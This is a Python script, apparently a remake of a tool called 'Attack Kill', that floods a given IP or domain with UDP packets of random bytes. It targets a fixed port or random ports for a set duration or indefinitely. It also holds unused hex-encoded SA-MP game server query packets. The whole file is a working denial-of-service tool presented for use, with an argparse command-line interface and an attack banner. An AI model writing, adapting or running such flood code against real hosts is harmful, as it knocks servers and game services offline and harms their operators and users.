from time import time as tt
import argparse
import socket
import random
import os
import struct
import codecs

Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

method = """\033[36m
╔════════════════════════════════╗
║ \033[35m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╦╔═╦╦  ╦  \033[36m ║
║ \033[35m╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╠╩╗║║  ║  \033[36m ║
║ \033[35m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╩ ╩╩╩═╝╩═╝\033[36m ║
║         REMAKE BY XXBR         ║
║          SC BY NESOFT          ║
╚════════════════════════════════╝
"""

os.system("clear")
def attack(ip, port, time, size):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(method)
    print("\033[34m<====>ATTACK KILL")
    fmt = '\033[35mATTACK KILL TO {ip} {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(666, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print('\033[92mAttack Done')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Usage: python kill.py <ip> <port> <time> <size>')

    parser.add_argument('ip', type=str, help='IP or domain to attack.')
    parser.add_argument('-p', '--port', type=int, default=None, help='Port number.')
    parser.add_argument('-t', '--time', type=int, default=None, help='Time in seconds.')
    parser.add_argument('-s', '--size', type=int, default=666, help='Size in bytes.')

    args = parser.parse_args()

    try:
        attack(args.ip, args.port, args.time, args.size)
    except KeyboardInterrupt:
        print('Attack stopped.')
